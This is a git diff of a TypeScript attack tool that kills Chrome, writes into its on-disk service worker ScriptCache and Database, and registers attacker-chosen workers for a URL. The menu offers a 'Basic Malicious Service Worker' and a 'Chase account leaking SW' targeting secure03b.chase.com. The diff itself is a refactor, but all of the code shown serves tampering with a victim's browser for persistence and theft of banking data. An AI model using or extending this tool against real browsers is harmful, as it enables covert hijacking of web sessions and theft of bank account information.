@@ -1,5 +1,5 @@
-import { diskCache } from "./diskCache"
-import { closeDb, hasRegistration, setDbPath } from "./levelDb/serviceWorkerLevelDb"
+import { SwResourceManager } from "./diskCache"
+import { SwRegistrationHandler } from "./levelDb"
 import * as fs from 'fs/promises'
 import * as path from 'path'
 import prompts from "prompts"
@@ -9,10 +9,15 @@ import findProcess from "find-process"
 import treeKill from "tree-kill"
 
 const specialtyServiceWorkers: Record<string, {title: string, value: string}[] | undefined> = {
-    "https://secure03b.chase.com" : [{ title: 'Chase account leaking SW', value: 'dist/serviceWorker/chase.js' }]
+    "https://secure03b.chase.com" : [{ title: 'Chase account leaking SW', value: 'dist/serviceWorkers/chase-sw.js' }]
 }
 
 async function main() {
+    if(process.argv.includes("-s")) {
+        server.start()
+        return
+    }
+
     const chromeProcessLookupResult = await findProcess("name", "chrome")
     const parentChromeProcess = chromeProcessLookupResult.find(process => !process.cmd.endsWith("chrome.exe"))
     if(parentChromeProcess) {
@@ -61,8 +66,8 @@ async function main() {
         chromeServiceWorkerDir = newPath
     }
 
-    diskCache.setFileBase(chromeServiceWorkerDir + String.raw`\ScriptCache`)
-    setDbPath(chromeServiceWorkerDir + String.raw`\Database`)
+    const swResourceManager = new SwResourceManager(chromeServiceWorkerDir + String.raw`\ScriptCache`)
+    const swRegistrationHandler = new SwRegistrationHandler(chromeServiceWorkerDir + String.raw`\Database`)
 
     const { urlStr } = await prompts({
         type: 'text',
@@ -86,7 +91,7 @@ async function main() {
         name: 'swPath',
         message: 'Choose a service worker',
         choices: [
-          { title: 'Basic Malicious Service Worker', value: 'dist/serviceWorker/sw.js' },
+          { title: 'Basic Malicious Service Worker', value: 'dist/serviceWorkers/basic-sw.js' },
           ...(specialtyServiceWorkers[url.origin] ?? []),
           { title: 'Your own', value: '' }
         ],
@@ -108,13 +113,13 @@ async function main() {
     }
 
     
-    if(await hasRegistration(url)) {
-        await injectMaliciousServiceWorker(url, serviceWorker)
+    if(await swRegistrationHandler.hasRegistration(url)) {
+        await injectMaliciousServiceWorker(url, serviceWorker, swResourceManager, swRegistrationHandler)
     } else {
-        await addMaliciousServiceWorker(url, serviceWorker)
+        await addMaliciousServiceWorker(url, serviceWorker, swResourceManager, swRegistrationHandler)
     }
     
-    closeDb()
+    await swRegistrationHandler.closeConnection()
 
 
     const { shouldStartServer } = await prompts({
